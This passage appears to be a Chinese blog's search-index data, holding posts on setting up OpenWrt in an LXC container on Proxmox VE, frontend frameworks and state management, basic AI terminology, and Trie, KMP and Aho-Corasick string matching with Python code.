5.13.19-2-pve\n准备工作：\n将网线连接到pve管理口，如果已安装openwrt，然后关闭原openwrt虚拟机，删除直通的网卡。\n准备一份没有引导的openwrt固件包，可以是img也可以是tar.gz，但一定是没有引导的包，可以看文件名中包含rootfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img或openwrt-21.02.0-x86-64-rootfs.tar.gz（前者是我自己编译的，重点在于rootfs）。\nPVE直通配置 连接到PVE，输入命令：\nnano /etc/default/grub 找到下面这一行：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet\u0026#34; 然后添加\u0026quot;intel_iommu=on\u0026quot;，这是英特尔的直通配置，AMD需要自行查找配置命令：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet intel_iommu=on\u0026#34; 然后更新引导：\nupdate-grub 修改nano /etc/modules内核模块文件，添加直通的驱动，让系统启动的时候载入这些驱动：\nvfio vfio_iommu_type1 vfio_pci vfio_virqfd 执行命令来更新内核：\nupdate-initramfs -u -k all. 创建基础环境文件包 tar.gz格式 如果包后缀为tar.gz，则通过scp直接上传至pve，以下[]内的字符根据自己情况进行替换（包括[和]符号），然后跳至下一章节：\nscp [固件路径.tar.gz] root@[pveIP地址]:/var/lib/vz/template/cache img格式 上传固件：\nscp [固件路径.img] root@[pveIP地址]:/root 这里需要注意，如果你的固件包是带squashfs字符，比如openwrt-x86-64-generic-squashfs-rootfs.img，你需要按照下面的方式进行解压。 安装解压包：\napt install squashfs-tools 解压镜像文件：\nunsquashfs [固件路径.img] 解压完成后你在同级目录下会得到squashfs-root文件夹，然后进入该文件夹，跳至3步骤。 如果你是不带squashfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img，则需要通过挂载镜像，得到内部文件，首先创建一个挂载点（下面操作在root目录中进行）：\nmkdir op 然后挂载镜像：\nmount -t ext4 -o loop [固件路径.img] /root/op 然后进入/root/op，跳至3步骤（完成后，通过使用umount /root/op进行卸载镜像）。\n打包为pve的CT模板包： 进入上述2步骤中得到的文件夹中，然后使用下列命令进行打包，得到的文件下文称为op-ct模版：\ntar zcf /var/lib/vz/template/cache/[固件名称].tar.gz .","title":"基于LXC容器的Openwrt搭建"},{"content":"最近几年单页应用程序发展非常迅速，从早期通过Javascript写入大量html模版去做单页程序（SPA），到现在的React、Vue（最为流行），但不得不说，前端的技术进步太快了，稍不关注技术，就会出来很多的新的技术。\n但归根结底，每次新的技术出来，埋头深入发现远比想象的复杂，而到了一定的时间后则能够想明白一些事情，这也就是\u0026quot;深入浅出\u0026quot;的道理。 单页应用是一个复杂的技术，要解决这些问题，出现了很多\u0026quot;框架\u0026quot;、工具，比如React、Vue、React-router、Redux等。对于新手来说更是学了一圈后出来也是懵的。但总体来说，React和Vue这类库本质都没有什么区别，都是为了解决SPA提出的方案。这类库大部分主要的理念是将Web应用划分为一个一个的组件为单元，这些组件可以包含另一个组件，以此来达到复用性。\n而每个组件不可能都显示一样，那这样复用性是没有意义的。 那这个时候提出了“状态”的概念，来让每个复用的组件显示不同的内容，状态分为了props和state，props是由外部传入进来的状态，state则是组件内部自己的状态。而这类UI库对于状态的变化，都会根据一些优秀的算法去重新渲染组件，并且渲染的时候仅仅涉及到改变的那一部分内容。\n之所以需要状态，其实告诉React这类库需要监听哪些值，方便在改变这些值的时候，React可以及时的进行计算和重新渲染组件。 比如下面的代码就可以通过传递name值进行重复使用包含\u0026lt;h2\u0026gt;标签的组件，这种方式传递的状态在内部就是使用props获取。\n\u0026lt;Header name=\u0026#39;hello\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;Hello\u0026lt;/h2\u0026gt; \u0026lt;Header name=\u0026#39;world\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;world\u0026lt;/h2\u0026gt; 而state则更多用于组件内部，比如当你鼠标点击需要获取一个报价，这个时候组件内部会发起一个请求，从服务器获取到报价后返回，改变状态，UI库进行重新渲染，这个时候就能获取到报价。 虽然说React提供了这些方便的功能，也提倡组件化和重复使用，但很多的组件是需要自己去一个一个写的。那这个时候，就有很多个人、组织开发出了\u0026quot;组件库\u0026quot;，\u0026ldquo;组件库\u0026quot;中包含了很多已经开发好可复用的组件，可以直接通过调用直接使用，这就是我们为什么看见除了React还有Ant Design、MaterialUI库。\n介绍完UI库和组件库后，单页应用还差一个东西，就是路由功能，路由也可以通过简单的Javascript来判断，比如当点击了一个链接后，Javascript将当前页面内容清除（隐藏），然后再渲染点击的目标内容。但是这个时候有一些问题，比如需要编写大量的代码、丢失浏览器的前进后退、没有办法收藏等问题（后面两个问题可以再通过增加代码去解决）。所以React-router-dom`这类的库就出现了，把所有的底层的逻辑和代码都进行封装提供一些接口，即大部分的人不需要再编写、理解这类的代码直接可以开箱即用，这也就是这类路由库出现的原因。 我们从前面了解到了状态分别为props和state，一个是外部，一个是内部的。\n那这个时候如果组件的嵌套过于\u0026quot;多层次\u0026quot;了后，比如从顶层的组件需要传递一个状态到第N层的组件中，那么每一层即使不需要不处理也要将状态进行传递，那这个时候涉及到的组件其中会包含非常多的和组件无关的代码。 所以这个时候需要一个通用的状态管理的解决方案（如Redux），让整个Web应用都共享一个大的状态，需要多层传递的状态则可以放在这个大状态内部，让不关心有些状态的组件不用去关心无关状态，而有些状态的组件去关心自己关心的状态。\nRedux本身设计是非常有趣的，整个应用的状态不能直接修改，这是因为如果大家都直接修改很有可能会造成状态的管理的混乱，所以Redux的修改状态流程是组件发起动作-\u0026gt;Dispatch函数接收动作-\u0026gt;reducer处理动作-\u0026gt;影响状态-\u0026gt;重新渲染组件。\n","permalink":"https://wuyizhou.com/posts/frontend-terms/","summary":"最近几年单页应用程序发展非常迅速，从早期通过Javascript写入大量html模版去做单页程序（SPA），到现在的React、Vue（最为流行），但不得不说，前端的技术进步太快了，稍不关注技术，就会出来很多的新的技术。\n但归根结底，每次新的技术出来，埋头深入发现远比想象的复杂，而到了一定的时间后则能够想明白一些事情，这也就是\u0026quot;深入浅出\u0026quot;的道理。 单页应用是一个复杂的技术，要解决这些问题，出现了很多\u0026quot;框架\u0026quot;、工具，比如React、Vue、React-router、Redux等。对于新手来说更是学了一圈后出来也是懵的。但总体来说，React和Vue这类库本质都没有什么区别，都是为了解决SPA提出的方案。这类库大部分主要的理念是将Web应用划分为一个一个的组件为单元，这些组件可以包含另一个组件，以此来达到复用性。\n而每个组件不可能都显示一样，那这样复用性是没有意义的。 那这个时候提出了“状态”的概念，来让每个复用的组件显示不同的内容，状态分为了props和state，props是由外部传入进来的状态，state则是组件内部自己的状态。而这类UI库对于状态的变化，都会根据一些优秀的算法去重新渲染组件，并且渲染的时候仅仅涉及到改变的那一部分内容。\n之所以需要状态，其实告诉React这类库需要监听哪些值，方便在改变这些值的时候，React可以及时的进行计算和重新渲染组件。 比如下面的代码就可以通过传递name值进行重复使用包含\u0026lt;h2\u0026gt;标签的组件，这种方式传递的状态在内部就是使用props获取。\n\u0026lt;Header name=\u0026#39;hello\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;Hello\u0026lt;/h2\u0026gt; \u0026lt;Header name=\u0026#39;world\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;world\u0026lt;/h2\u0026gt; 而state则更多用于组件内部，比如当你鼠标点击需要获取一个报价，这个时候组件内部会发起一个请求，从服务器获取到报价后返回，改变状态，UI库进行重新渲染，这个时候就能获取到报价。 虽然说React提供了这些方便的功能，也提倡组件化和重复使用，但很多的组件是需要自己去一个一个写的。那这个时候，就有很多个人、组织开发出了\u0026quot;组件库\u0026quot;，\u0026ldquo;组件库\u0026quot;中包含了很多已经开发好可复用的组件，可以直接通过调用直接使用，这就是我们为什么看见除了React还有Ant Design、MaterialUI库。\n介绍完UI库和组件库后，单页应用还差一个东西，就是路由功能，路由也可以通过简单的Javascript来判断，比如当点击了一个链接后，Javascript将当前页面内容清除（隐藏），然后再渲染点击的目标内容。但是这个时候有一些问题，比如需要编写大量的代码、丢失浏览器的前进后退、没有办法收藏等问题（后面两个问题可以再通过增加代码去解决）。所以React-router-dom`这类的库就出现了，把所有的底层的逻辑和代码都进行封装提供一些接口，即大部分的人不需要再编写、理解这类的代码直接可以开箱即用，这也就是这类路由库出现的原因。 我们从前面了解到了状态分别为props和state，一个是外部，一个是内部的。\n那这个时候如果组件的嵌套过于\u0026quot;多层次\u0026quot;了后，比如从顶层的组件需要传递一个状态到第N层的组件中，那么每一层即使不需要不处理也要将状态进行传递，那这个时候涉及到的组件其中会包含非常多的和组件无关的代码。 所以这个时候需要一个通用的状态管理的解决方案（如Redux），让整个Web应用都共享一个大的状态，需要多层传递的状态则可以放在这个大状态内部，让不关心有些状态的组件不用去关心无关状态，而有些状态的组件去关心自己关心的状态。\nRedux本身设计是非常有趣的，整个应用的状态不能直接修改，这是因为如果大家都直接修改很有可能会造成状态的管理的混乱，所以Redux的修改状态流程是组件发起动作-\u0026gt;Dispatch函数接收动作-\u0026gt;reducer处理动作-\u0026gt;影响状态-\u0026gt;重新渲染组件。","title":"前端的技术栈理解"},{"content":"人工智能 人工智能是一个比较广泛的概念，这个概念实际上指的是让机器像人一样思考，其最早由计算机科学之父阿兰图灵在1950年的一篇《计算机器与智能》论文中写出“如果电脑能在5分钟能回答由人类测试者提出的一系列的问题，且超过30%回答让测试者误认为人类所答，则电脑通过测试”，这段话也直接启蒙式的开启了人工智能领域的研究。 而“人工智能”一词，第一次出现在1956年，达特茅斯大学召开的学术会议室，由人工智能之父约翰·麦卡锡首次提出。 通常人工智能被分为弱人工智能和强人工智能，前者可以让机器有一定程度的学习、理解和推理能力，后者则是由自适应能力，比如解决一些之前没有遇见过的问题，我们常在电影里看见的机器人就是一种强人工智能。\n机器学习 机器学习为人工智能的一个研究分支，也可以理解为弱人工智能的一种实现，而机器学习做的事情是让机器取模拟和实现人类的学习行为，以获得新的技能和知识。 人工智能领域的先驱Arthur Samuel在1959年给出的机器学习定义为“不直接编程，却能赋予计算机提供能力的方法”，而美国工程院院士Tom Mitchell则给出了一个更明确的含义，指出“机器学习是通过某项人物的经验数据提高了在该人物上的能力”。 机器学习最基本的是利用给出的算法来解析数据，从中学习到一定规则(模式)得到经验，并利用学习到的经验对类似的问题作出预测和判断。 而如今机器学习已在多个领域得到了很好的应用，大致上可以将机器学习的分为几个研究方向：\n模式识别 自然语言处理 数据挖掘 计算机视觉 语言识别 统计学习 算法 前面提到机器学习需要给出算法来解析（学习）数据，以获得经验，而这个算法则包括我们常说的“神经网络”也是机器学习算法的一种，常见的算法有如下：\n回归算法 神经网络算法 SVM向量机 聚类算法 降维算法 推荐算法 决策树 朴素贝叶斯 其他算法 而根据这些算法可以分为监督学习、无监督学习、半监督学习、强化学习，其中监督学习在日语中被称为“有老师的学习”，本质上是让机器学习带有“标准答案”的数据，然后再让机器学习做题，根据做题的结果对比标准答案，根据误差进行调整，经过多次反复，让机器的误差越来越小。 像上面这样在带有标签（答案）的数据上学习的过程被称为“训练”，而训练用到的数据被称为“训练集”，但也被叫做“数据集”，因为该数据集是被拿来训练的，所以被称为训练集，同样训练集在自然语言处理中被称为“语料库”。在训练集里面每一个数据被称为“样本”，在训练过程中反复针对误差作出的调整则被称为“调参”。 而训练出来的结果则为称为“模型”，模型其实也是算法，但为了区分，所以将机器学习的结果称为模型。模型可以用来针对训练集相似类型的问题去得到一个结论（值），这个过程则被称为\u0026quot;预测\u0026quot; 无监督学习在日语中被称为“没有老师的学习”，这就意味着数据不含标准答案，机器可以发现数据与数据之间的关联，但无法发现数据与答案之间的关联，常见的无监督学习算法有聚类、降维等算法。 半监督学习是利用多个模型对同一个实例进行预测，如果这些结果多数一致，则可以将这个实例和结果放在一起作为新的训练集，由于半监督学习可以利用标注数据来丰富未标注数据，所以目前正是热门的研究。 之所以半监督学习这样热门是因为带有“标准答案”的数据集几乎都是由人工整理和标注，需要大量的人力、成本、时间，也被叫为“黄金数据（Gold Data）”，所以半监督学习则可以用少量的标注数据集来得到更多的标注数据集来减少其人工、成本、时间。 强化学习针对的是需要一系列彼此关联决策的问题，比如自动驾驶、电子竞技等，这类问题往往需要一边预测，一边跟着环境的反馈规划下一次决策。\n特征工程 特征工程一般情况下分为“特征提取”和“特征模板”，特征提取指的是将我们要处理的实例转换为计算机能处理的数值类型的特征值，比如判断名字“沈雁冰”性别为例，特征提取则大概表示如下：\n特征序号 特征条件 特征值 1 是否含“雁” 1 2 是否含“冰” 1 而对于大量的数据进行手动的特征提取是不太现实的，而需要定义一套特征模板来进行提取，比如一大堆的姓名数据，表示为name，那么可以定义name[1]+name[2]这样的特征模板，然后通过这个模板在相同类的样本中遍历组合则这一类的数据基本上各种情况的特征基本上覆盖完了。\n深度学习 深度学习本质就是为神经网络算法，在2006年人工智能专家Geoffrey Hinton等人研究出一个名为“深度信念网络”，率先使用了“深度”一词，他们在这里面引入了一个叫“Greedy layer wise pre-training”策略，而其他研究者发现这个策略对于训练深层的神经网络很有效果，所以深层神经网络也叫深度学习。\n参考文章 什么是机器学习？ 人工智能、机器学习、深度学习、神经网络概念说明 神经网络啥时候改名叫“深度学习”了？ 深度学习和人工智能之间是什么样的关系？ 《自然语言处理入门》 ","permalink":"https://wuyizhou.com/posts/inteliigence-terms/","summary":"人工智能 人工智能是一个比较广泛的概念，这个概念实际上指的是让机器像人一样思考，其最早由计算机科学之父阿兰图灵在1950年的一篇《计算机器与智能》论文中写出“如果电脑能在5分钟能回答由人类测试者提出的一系列的问题，且超过30%回答让测试者误认为人类所答，则电脑通过测试”，这段话也直接启蒙式的开启了人工智能领域的研究。 而“人工智能”一词，第一次出现在1956年，达特茅斯大学召开的学术会议室，由人工智能之父约翰·麦卡锡首次提出。 通常人工智能被分为弱人工智能和强人工智能，前者可以让机器有一定程度的学习、理解和推理能力，后者则是由自适应能力，比如解决一些之前没有遇见过的问题，我们常在电影里看见的机器人就是一种强人工智能。\n机器学习 机器学习为人工智能的一个研究分支，也可以理解为弱人工智能的一种实现，而机器学习做的事情是让机器取模拟和实现人类的学习行为，以获得新的技能和知识。 人工智能领域的先驱Arthur Samuel在1959年给出的机器学习定义为“不直接编程，却能赋予计算机提供能力的方法”，而美国工程院院士Tom Mitchell则给出了一个更明确的含义，指出“机器学习是通过某项人物的经验数据提高了在该人物上的能力”。 机器学习最基本的是利用给出的算法来解析数据，从中学习到一定规则(模式)得到经验，并利用学习到的经验对类似的问题作出预测和判断。 而如今机器学习已在多个领域得到了很好的应用，大致上可以将机器学习的分为几个研究方向：\n模式识别 自然语言处理 数据挖掘 计算机视觉 语言识别 统计学习 算法 前面提到机器学习需要给出算法来解析（学习）数据，以获得经验，而这个算法则包括我们常说的“神经网络”也是机器学习算法的一种，常见的算法有如下：\n回归算法 神经网络算法 SVM向量机 聚类算法 降维算法 推荐算法 决策树 朴素贝叶斯 其他算法 而根据这些算法可以分为监督学习、无监督学习、半监督学习、强化学习，其中监督学习在日语中被称为“有老师的学习”，本质上是让机器学习带有“标准答案”的数据，然后再让机器学习做题，根据做题的结果对比标准答案，根据误差进行调整，经过多次反复，让机器的误差越来越小。 像上面这样在带有标签（答案）的数据上学习的过程被称为“训练”，而训练用到的数据被称为“训练集”，但也被叫做“数据集”，因为该数据集是被拿来训练的，所以被称为训练集，同样训练集在自然语言处理中被称为“语料库”。在训练集里面每一个数据被称为“样本”，在训练过程中反复针对误差作出的调整则被称为“调参”。 而训练出来的结果则为称为“模型”，模型其实也是算法，但为了区分，所以将机器学习的结果称为模型。模型可以用来针对训练集相似类型的问题去得到一个结论（值），这个过程则被称为\u0026quot;预测\u0026quot; 无监督学习在日语中被称为“没有老师的学习”，这就意味着数据不含标准答案，机器可以发现数据与数据之间的关联，但无法发现数据与答案之间的关联，常见的无监督学习算法有聚类、降维等算法。 半监督学习是利用多个模型对同一个实例进行预测，如果这些结果多数一致，则可以将这个实例和结果放在一起作为新的训练集，由于半监督学习可以利用标注数据来丰富未标注数据，所以目前正是热门的研究。 之所以半监督学习这样热门是因为带有“标准答案”的数据集几乎都是由人工整理和标注，需要大量的人力、成本、时间，也被叫为“黄金数据（Gold Data）”，所以半监督学习则可以用少量的标注数据集来得到更多的标注数据集来减少其人工、成本、时间。 强化学习针对的是需要一系列彼此关联决策的问题，比如自动驾驶、电子竞技等，这类问题往往需要一边预测，一边跟着环境的反馈规划下一次决策。\n特征工程 特征工程一般情况下分为“特征提取”和“特征模板”，特征提取指的是将我们要处理的实例转换为计算机能处理的数值类型的特征值，比如判断名字“沈雁冰”性别为例，特征提取则大概表示如下：\n特征序号 特征条件 特征值 1 是否含“雁” 1 2 是否含“冰” 1 而对于大量的数据进行手动的特征提取是不太现实的，而需要定义一套特征模板来进行提取，比如一大堆的姓名数据，表示为name，那么可以定义name[1]+name[2]这样的特征模板，然后通过这个模板在相同类的样本中遍历组合则这一类的数据基本上各种情况的特征基本上覆盖完了。\n深度学习 深度学习本质就是为神经网络算法，在2006年人工智能专家Geoffrey Hinton等人研究出一个名为“深度信念网络”，率先使用了“深度”一词，他们在这里面引入了一个叫“Greedy layer wise pre-training”策略，而其他研究者发现这个策略对于训练深层的神经网络很有效果，所以深层神经网络也叫深度学习。\n参考文章 什么是机器学习？ 人工智能、机器学习、深度学习、神经网络概念说明 神经网络啥时候改名叫“深度学习”了？ 深度学习和人工智能之间是什么样的关系？ 《自然语言处理入门》 ","title":"人工智能基础名词理解"},{"content":"Trie树 在上一篇文章当中，说到了一些匹配的算法，但是算法有了，还得需要一个高效的数据结构，不能只是通过[\u0026lsquo;中国人\u0026rsquo;, \u0026lsquo;中东人\u0026rsquo;]等结构来进行存放，可以想象一下，如果有几十万的词，那么这个列表的占用的内存非常大。 Trie树，也被称为前缀树，该词源自单词retrieval，发音和try相同，Trie树可为词库提供一种高效的分词数据结构，该结构本质上是一种树状数据结构，比如\u0026quot;中国人\u0026quot;、\u0026ldquo;中东人\u0026quot;三个字符串构造的Trie树为下图，图中能够很清楚的看见，Trie树结构能够很好的节省相同前缀单词所浪费的空间，因为这两个词都是以\u0026quot;中\u0026quot;开头，所以可以使用同一个父辈节点。\n除此之外，Trie树还对查询的速度有一定的优化，如果以列表存放词来说，如果列表存放的词达到了20万个，那么最坏的情况是你需要匹配的词在存放于列表最后，那么就相当于要将这20万个词全部遍历，可想而知浪费了非常多的计算资源。 而Trie查询的次数最大的次数取决于查找的字符串长度，比如中国人，那么查询次数最大仅为3次。 下图为基于同一份10万左右的词典，待分词文本为字符长度150，使用正向最大匹配算法在列表和Trie两种结构上进行分词的运行时间，从下图可以看出来差距非常大。\nTrie树的查找方式则是通过层层查询，而不是直接遍历词典，比如\u0026quot;中国人\u0026rdquo;，首先会查找第一层中是否有\u0026quot;中\u0026quot;这个字符，如果没有查询到则返回查询失败，如果有则继续查找\u0026quot;中\u0026quot;字符对应的下一层是否有\u0026quot;国\u0026quot;，如果没有则返回查询识别，如果有则继续查找\u0026quot;国\u0026quot;下一层是否有\u0026quot;人\u0026quot;，此时找到存在\u0026quot;人\u0026quot;这个节点，并且该节点标注为蓝色，表明是一个词，所以返回该字符串为一个词。 其实要实现这样的数据结构，大致的功能点为下面两点：\n查询词 添加词 除此之外还需要考虑如果标记词的结束节点，首先可以约定，默认情况都返回\u0026quot;False\u0026quot;表示为未查询到或设置失败，而返回\u0026quot;True\u0026quot;则表示查询到或设置成功，每个节点为一个字符，而字典当中的__value表示是否为结束节点（即一个词的尾字符），如果是则为True，不是则为False，整体可以采用函数或者类来定义。 实现代码：\nclass Trie(): #定义一个Trie类型 def __init__(self): #为这个生成的实例定义一个名为_children的对象，用于存放词的Trie结构 self._children = {} def _add_word(self, word): # 定义一个添加词的实例方法 child = self._children # 首先会将_children的对象赋值给child for i,char in enumerate(word): # 然后从头遍历添加词的每一个字符 if char not in child: # 查看当前字符是否存在Trie树上 child[char] = {\u0026#39;__value\u0026#39;: False} # 如果没有则新建一个对象，并设置特殊key__value为False，表明这不是一个结尾字符 if i == (len(word) - 1): # 判断是否为结尾字符 child[char][\u0026#39;__value\u0026#39;] = True # 如果是则将特殊key：__value设为True，表明为结尾字符 child = child[char] # 如果还有字符，则将当前字符对象更新为child，那么下一次查找则是基于上一次对象下 return True # 添加完成返回True def _get_word(self, word): # 查找词 child = self._children # 同样设置一个child变量，用于控制当前的字符对象 for char in word: child = child.get(char) if child is None : # 只要其中一个没有查找到，那么说明匹配识别，则返回False return False return child[\u0026#39;__value\u0026#39;] # 如果没有匹配失败则返回特殊__value的值 #回True表示词典中存在该词，返回False表示不存在或者传递进来的词不成词 将Trie实现后，就可以在正向或者反向等算法中来进行使用，从而提高运算的效率，但是使用Trie树的时候，可能无法动态的计算其词的长度，所以根据上一篇文章当中修改的最大正向匹配算法的长度计算我手动计算填写。 下面的代码是基于《[一]漫话中文分词：最大匹配,双向最大,最小词数》文章中的最大正向匹配算法，但其中的词典则是使用Trie结构，改动了两处：\ntrie = Trie() trie._add_word(\u0026#39;分词\u0026#39;) sentence = \u0026#39;中文分词算法\u0026#39; start = 0 maxWidth = 2 # 改动1：手动填写最大长度 cut_result = [] while (start \u0026lt;= len(sentence)): end = start + maxWidth word = sentence[start: end] while ( word ) : if ( trie._get_word(word) ) : # 改动2：利用Trie的查询函数，该返回查询到为词则返回True，否则False cut_result.append(word) start = start + len(word) - 1 break if (len(word[:-1]) == 0): cut_result.append(word) break word = word[:-1] start = start + 1 print(cut_result) #[\u0026#39;中\u0026#39;, \u0026#39;文\u0026#39;, \u0026#39;分词\u0026#39;, \u0026#39;算\u0026#39;, \u0026#39;法\u0026#39;] KMP算法 高效的数据结构有了，然而还可以更近一步，在Trie结构的基础上采用一些高效的查询算法，比如下面的AC自动机，在了解AC自动机之前，可以先了解一下KMP算法，虽然了解AC自动机不需要了解KMP算法就可以理解，但是理解了KMP算法过后，实际上会更容易理解AC自动机。 KMP算法于1977年由James H. Morris](https://en.wikipedia.org/wiki/James_H._Morris)、Donald Knuth、Vaughan Pratt三位发明者联合发表，其算法名称KMP是由三位发明者首字母命名。 KMP算法其核心主要为利用已匹配字符串中的已知信息来减少无效匹配的次数，从而提升查找的效率。首先可以来看看普通查找方式，找到一个字符串在另外一个字符串中出现的位置该怎么来匹配。 比如搜索词ABABC，需要查找在文本ABABABC中出现的位置，那么按照常规的方式应该首先第一个字符，是否相等：\n如果第一个字符相等，那么继续匹配第二个字符，查看第二个字符是否相等：\n如果第二字符相等再匹配下一个字符是否相等，一直匹配，直到第五个字符出现了问题，不相等：\n此时，将搜索词的位置往后移动一位，即搜索词的第一个字符从文本的第二个字符开始匹配：\n移动过后，第一位不匹配，那么继续将模式串移动一位，将模式串第一个字符对准字符串第三个字符，继续重新匹配，第一次匹配：\n第一次匹配成功，继续第二位，第三位匹配，一直遍历匹配到搜索词最后一个字符成功，那么整个搜索结束，并返回该搜索词第一次出现的位置为文本的第三位。\n从上面的例子来看，第二次明显属于无效匹配，如果在大量的文本中搜索词的话，会造成更多这样的无效匹配出现，而KMP算法就是解决这样的问题，用来减少无效的匹配次数，从而来增加匹配的效率。 KMP算法首先需要维护一个特殊的表，名字为部分匹配表或者失配函数，这个表由非负数数值构成，并且搜索词的字符都会对应一个数值，大概为下面这样：\n关于这个值是如何计算的先不用管，先看看如何使用这个值来跳过无效的匹配，还是拿刚刚例子，搜索词ABABC，文本ABABABC，首先进行第一次匹配：\n第一次匹配成功，进入第二次匹配：\n第二次匹配成功，重复该动作，直到匹配到第五次出现了问题，此时搜索词第五位的C和文本的第五位A不相等，此时KMP算法中的部分匹配表就派上了用场，可以通过该表计算出需要搜索词下一个开始匹配的位置是从什么地方开始，这样就可以跳过无效匹配位的值。其计算公式为：\n位移值 = 成功匹配的数量 - 匹配失败位前一位在部分匹配表中的值 因为匹配失败的位置是在第五位，那么获取部分匹配表中的值应该位前一位的值，通过查询下图得到数值2，然后匹配成功的字符数量为4，最后相减得到2。\n从上面得到数值后，就可以将搜索词当前开始的位置加2，因为此时的搜索词开始的位置是文本的第1位，那么加上后得到3，就意味着搜索词的第一位对应着文本的第三位：\n而通过KMP的算法就可以跳过对应普通查找方法的第二次匹配，这在大量的文本搜索当中提升是非常显著的，但是怎么来计算部分匹配表的中的值？ 部分匹配表指的是最长相同字符的长度，要计算部分匹配表首先需要知道前缀和后缀的概念，前缀指的是除了字符串第一个字符之外的所有字符串头部集合，而后缀指的是除了字符串最后一个字符之外的所有后部集合。 比如说单词home，其前后缀集合为：\n前缀集合为：{h, ho, hom} 后缀集合为：{ome, me, e} 而部分匹配表需要对每一位进行计算相应的值，而在搜索词的每一位取的范围字符为前面所有字符，比如ABABC，计算第一位因为前面没有字符，所以取的范围仅为A。到第二位则包含前面所有字符，所以等于AB。第三位则为ABA以此类推 再回到上面例子中，搜索词ABABC，其计算部分匹配表的过程为：\nA：前后缀都为空，则值为0 AB：前缀为{A},后缀为{B},没有相同的字符，部分匹配表中的值为0 ABA：前缀为{A, AB},后缀为{BA, A}，其中有字符A交集，其长度为1，部分匹配表中的值为1 ABAB：前缀为{A,AB,ABA},后缀为{BAB,AB,B}，有相同字符AB，长度为2，部分匹配表中的值为2 ABABC：前缀为{A,AB,ABA,ABAB},后缀为{BABC,ABC,BC,C}，没有相同字符，部分匹配表中的值为0 AC自动机 AC自动机(Aho-Corasick automaton)是一种基于Trie树进行匹配的一种字符串搜索算法，在1975年由Alfred V. Aho和Margaret J.Corasick发明，该算法其实和KMP算法并无太大的关联，KMP算法是1对1（一个搜索词匹配一个文本）进行搜索，而AC自动机则是1对多（多个搜索词匹配一个文本）进行搜索。 AC自动机对比Trie树的优点在于Trie树每次匹配后进行下一个字符查找的时候都需要回到顶点继续再搜索，而AC自动机则是将该文本中的字符串搜索一次性完成。 AC自动机核心是利用一个叫fail指针(失败指针)的东西，fail指针主要的用途是如果当前字符在当前节点的子元素中没有找到，那么就利用fail指针指向另外一个节点继续搜索，直到搜索完成，下图中的红线就是一个fail指针。\n比如单词列表为['he', 'hers', 'his', 'she']，待分词文本为hershe，正常Trie匹配为先找到he，然后字符r再从0开始匹配，此时r没有在顶层节点的子节点当中，所以跳过，继续查找，直到找到了she完成。 而AC自动机的算法则为当找到了he单词后，继续在当前节点的子节点当中搜索字符r，如果有继续搜索下一个字符s，然后得到单词信息hers，然后继续搜索字符h，此时搜索位置为下图红色节点位置，但该节点下没有h：\n这个时候就查看当前节点（即红色节点）的fail指针(红线)指向的节点下是否有字符h，此时发现有，则通过fail指针继续查找，直到找到了单词she。 AC自动机的理念是比较好理解，而难点在于如何计算fail指针指向谁，计算fail指针可以通过BFS（层次遍历），BFS将Trie每一层进行遍历，遍历的时候将计算所有子节点的fail指针，并将子节点放入到一个先进先出容器当中（队列）便于访问子节点的子节点。 而计算fail指针的时候一定是当前字符不存在于当前节点的子节点当中，所以查找当前节点的子节点的fail指针的时候，可以通过将当前节点的子节点中的所有fail指针都可以获取到所有父节点的fail指针，然后一层一层的找，如果找到后就指向谁，如果没有找到则指向最顶层。 下面是实现的代码：\nclass TrieNode(object): def __init__(self) -\u0026gt; None: self._children = {} self._fail = None self._exist = [] def _add_child(self, char, value, overwrite = None): child = self._children.get(char) if child is None: child = TrieNode() self._children[char] = child if overwrite: child._exist.append(value) return child class Trie(TrieNode): def __init__(self) -\u0026gt; None: super().__init__() def _find_text(self, text): state = self cut_word = [] for i,t in enumerate(text): while state._children.get(t) is None and state._fail: state = state._fail if state._children.get(t) is None: continue state = state._children.get(t) if len(state._exist) != 0: for x in state._exist: max_cut = text[i - x + 1:i + 1] cut_word.append(max_cut) return cut_word def __setitem__(self, key, value): state = self for char in key: if char == key[-1] : state = state._add_child(char, len(value), True) break state = state._add_child(char, None, False) def _init_fail(self): q = queue.Queue() for i in self._children: state = self._children.get(i) state._fail = self q.put(state) while q.empty() == False: state = q.get() for i in state._children: v = state._children.get(i) fafail = state._fail while fafail is not None and fafail._children.get(i) is not None: fafail = fafail._children.get(i) v._fail = fafail if v._fail: if len(fafail._exist) != 0: v._exist.extend(v._fail._exist) q.put(v) 参考文档 如何更好地理解和掌握 KMP 算法? KMP算法-维基百科 字符串匹配的KMP算法\n","permalink":"https://wuyizhou.com/posts/chinesecutwords-2/","summary":"Trie树 在上一篇文章当中，说到了一些匹配的算法，但是算法有了，还得需要一个高效的数据结构，不能只是通过[\u0026lsquo;中国人\u0026rsquo;, \u0026lsquo;中东人\u0026rsquo;]等结构来进行存放，可以想象一下，如果有几十万的词，那么这个列表的占用的内存非常大。 Trie树，也被称为前缀树，该词源自单词retrieval，发音和try相同，Trie树可为词库提供一种高效的分词数据结构，该结构本质上是一种树状数据结构，比如\u0026quot;中国人\u0026quot;、\u0026ldquo;中东人\u0026quot;三个字符串构造的Trie树为下图，图中能够很清楚的看见，Trie树结构能够很好的节省相同前缀单词所浪费的空间，因为这两个词都是以\u0026quot;中\u0026quot;开头，所以可以使用同一个父辈节点。\n除此之外，Trie树还对查询的速度有一定的优化，如果以列表存放词来说，如果列表存放的词达到了20万个，那么最坏的情况是你需要匹配的词在存放于列表最后，那么就相当于要将这20万个词全部遍历，可想而知浪费了非常多的计算资源。 而Trie查询的次数最大的次数取决于查找的字符串长度，比如中国人，那么查询次数最大仅为3次。 